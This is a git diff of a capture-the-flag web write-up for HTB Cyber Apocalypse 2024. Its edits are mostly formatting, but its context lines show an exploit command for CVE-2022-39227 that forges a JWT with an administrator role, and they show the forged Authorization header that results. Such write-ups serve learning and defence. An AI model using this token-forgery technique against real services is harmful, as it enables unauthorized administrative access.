@@ -7,14 +7,11 @@ image:
  width: 650
 categories: [HTB Writeups, Cyber Apocalypse CTF]
 tags: [Writeup, CTF, Web]
+toc: true
 ---
 
 I participated as a member of team **CibersecUNI**. In the web category we solved 6/9 challenges as a team. In this writeup I will go through the ones that I have solved:
 
-- [Testimonial](https://s4yhii.github.io/posts/CyberApocalypse2024_Web/#Testimonial)
-- [Labyrinth Linguist](https://s4yhii.github.io/posts/CyberApocalypse2024_Web/#Labyrinth-Linguist)
-- [TimeKORP](https://s4yhii.github.io/posts/CyberApocalypse2024_Web/#TimeKORP)
-- [LockTalk](https://s4yhii.github.io/posts/CyberApocalypse2024_Web/#LockTalk)
 
 # Testimonial
 
@@ -387,7 +384,7 @@ First we need to retrieve the JWT in `/api/v1/get_ticket` endpoint, but its kind
 
 Inspecting the `haproxy.conf` file, we see that the HAProxy is denying requests to endpoints starting with `/api/v1/get_ticket`.
 
-```http
+```bash
 global
     daemon
     maxconn 256
@@ -435,7 +432,7 @@ python3 cve_2022_39227.py -j herecomesyourtoken -i "role=administrator"
 
 The return value is a mix form of JSON and compact representation. You need to paste the entire value including "{" and "}" as your new JWT Web token.
 
-```json
+```bash
 Authorization: {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzOTY2NTAsImlhdCI6MTcxMDM5MzA1MCwianRpIjoiS1dIQVhUeWRUWXhJWHdlWjIwMU5VUSIsIm5iZiI6MTcxMDM5MzA1MCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAzOTY2NTAsImlhdCI6MTcxMDM5MzA1MCwianRpIjoiS1dIQVhUeWRUWXhJWHdlWjIwMU5VUSIsIm5iZiI6MTcxMDM5MzA1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"s-TtAkIi6JBvYqfdx9H8oWF5mA4-tOWPKGfv3rCPlIrA8ncyMgC9Ltobo_gk9GXaj9LmydRKKJPpYuCPsf8IFEmI3ex7LRx6mm84jKhTYQh09_X2U7TToEx-OEFdL7yz0OGKCQOLdBHiEYXVTGWnwIuP8tunOmws2OyVKH3FFI1SgtKAo7RtgwxD6spZBiv3R75B55mp8RDFMzh4luqmXMfV0sSw-mA8zRnr9J2Kb3Cpab88d-3HzQm99wrtwOM-t35ZDUsSFHw4CRyN4XQyuwvHlz2dltUjb8ZnPR7U8naiaSbC0MJIBmPezP26FKGpcpQpBtX5pg01zoKAu7C6OQ"}
 ```
 
